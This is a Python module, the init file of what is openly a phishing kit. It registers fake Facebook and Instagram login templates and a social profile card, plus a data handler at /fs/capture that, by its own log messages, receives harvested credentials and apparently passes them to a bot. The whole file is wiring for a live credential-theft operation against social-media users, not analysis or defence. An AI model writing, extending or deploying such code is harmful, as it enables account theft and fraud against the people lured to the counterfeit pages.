# fake_sites/__init__.py
# ============================================================
# Fake Sites Manager — v2
# يشمل Facebook + Instagram + Social Profile Card
# + Data Handler (اللي بيستقبل البيانات)
# ============================================================
import os
from logging_config import get_logger
from monitoring import metrics

logger = get_logger("fake_sites")


# ============================================================
# [1] Facebook Templates
# ============================================================
try:
    from .facebook import init_facebook_templates
    FACEBOOK_ENABLED = True
    logger.info("[+] fake_sites.facebook loaded")
except Exception as e:
    logger.exception(f"[-] facebook import failed: {e}")
    FACEBOOK_ENABLED = False
    def init_facebook_templates(app):
        pass


# ============================================================
# [2] Instagram Templates
# ============================================================
try:
    from .instagram import init_instagram_templates
    INSTAGRAM_ENABLED = True
    logger.info("[+] fake_sites.instagram loaded")
except Exception as e:
    logger.exception(f"[-] instagram import failed: {e}")
    INSTAGRAM_ENABLED = False
    def init_instagram_templates(app):
        pass


# ============================================================
# [3] Social Profile Card
# ============================================================
try:
    from .social_profile import init_social_profile
    SOCIAL_PROFILE_ENABLED = True
    logger.info("[+] fake_sites.social_profile loaded")
except Exception as e:
    logger.exception(f"[-] social_profile import failed: {e}")
    SOCIAL_PROFILE_ENABLED = False
    def init_social_profile(app, bot):
        pass


# ============================================================
# [4] Data Handler — ⚡ الأهم
# ============================================================
try:
    from .data_handler import init_data_handler
    DATA_HANDLER_ENABLED = True
    logger.info("[+] fake_sites.data_handler loaded")
except Exception as e:
    logger.exception(f"[-] data_handler import failed: {e}")
    DATA_HANDLER_ENABLED = False
    def init_data_handler(app, bot):
        pass


# ============================================================
# [5] Init All
# ============================================================
def init_fake_sites(app, bot):
    """
    تسجيل كل مسارات المواقع المزيفة
    """
    logger.info("=" * 60)
    logger.info("🌐 Initializing Fake Sites...")
    logger.info("=" * 60)

    # ─── 1. Data Handler (لازم يكون الأول!) ───
    if DATA_HANDLER_ENABLED:
        try:
            init_data_handler(app, bot)
            logger.info("[+] ✅ Data handler registered: /fs/capture")
            metrics.inc_counter("fake_sites_loaded", tags={"type": "data_handler"})
        except Exception as e:
            logger.exception(f"[-] Data handler registration failed: {e}")
    else:
        logger.error("[-] ❌ Data handler DISABLED — credentials won't arrive!")

    # ─── 2. Facebook ───
    if FACEBOOK_ENABLED:
        try:
            init_facebook_templates(app)
            logger.info("[+] Facebook templates registered")
            metrics.inc_counter("fake_sites_loaded", tags={"type": "facebook"})
        except Exception as e:
            logger.exception(f"[-] Facebook templates registration failed: {e}")
    else:
        logger.warning("[-] Facebook templates: DISABLED")

    # ─── 3. Instagram ───
    if INSTAGRAM_ENABLED:
        try:
            init_instagram_templates(app)
            logger.info("[+] Instagram templates registered")
            metrics.inc_counter("fake_sites_loaded", tags={"type": "instagram"})
        except Exception as e:
            logger.exception(f"[-] Instagram templates registration failed: {e}")
    else:
        logger.warning("[-] Instagram templates: DISABLED")

    # ─── 4. Social Profile Card ───
    if SOCIAL_PROFILE_ENABLED:
        try:
            init_social_profile(app, bot)
            logger.info("[+] Social Profile Card registered")
            metrics.inc_counter("fake_sites_loaded", tags={"type": "social_profile"})
        except Exception as e:
            logger.exception(f"[-] Social Profile registration failed: {e}")
    else:
        logger.warning("[-] Social Profile: DISABLED")

    logger.info("=" * 60)
    logger.info("✅ Fake Sites initialization complete")
    logger.info("=" * 60)


__all__ = [
    'init_fake_sites',
    'init_facebook_templates',
    'init_instagram_templates',
    'init_social_profile',
    'init_data_handler',
    ]
